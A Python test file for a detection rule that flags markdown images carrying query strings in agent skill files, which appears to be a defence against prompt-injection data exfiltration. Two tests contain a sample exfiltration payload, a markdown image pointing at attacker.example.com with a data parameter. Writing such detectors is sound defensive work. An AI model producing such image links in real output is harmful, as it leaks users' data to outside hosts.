"""PI-MDIMG-001 — markdown-image with query string."""

from __future__ import annotations

from collections.abc import Callable
from typing import Any

import yaml

from pruner_wrapper.types import Rule
from tests.rules._helpers import assert_yaml_valid, expect_match, expect_no_match


def test_yaml_validates_against_schema(
    rule_v1_schema: dict[str, Any], rules_root: Any
) -> None:
    raw = yaml.safe_load(
        (rules_root / "supply-chain" / "PI-MDIMG-001-markdown-image-exfil.yml")
        .read_text(encoding="utf-8")
    )
    assert_yaml_valid(raw, rule_v1_schema)


def test_query_string_image_fires(rule_loader: Callable[[str], Rule]) -> None:
    expect_match(rule_loader("PI-MDIMG-001"),
                 "![pixel](https://attacker.example.com/?data=X)",
                 file_path="skills/x/SKILL.md")


def test_plain_image_does_not_fire(rule_loader: Callable[[str], Rule]) -> None:
    expect_no_match(rule_loader("PI-MDIMG-001"),
                    "![logo](https://example.com/logo.png)",
                    file_path="skills/x/SKILL.md")


def test_fenced_block_suppression(rule_loader: Callable[[str], Rule]) -> None:
    """ignore_in_fenced_blocks: true means images inside ``` are skipped."""
    text = "```\n![pixel](https://attacker.example.com/?data=X)\n```\n"
    expect_no_match(rule_loader("PI-MDIMG-001"), text, file_path="skills/x/SKILL.md")
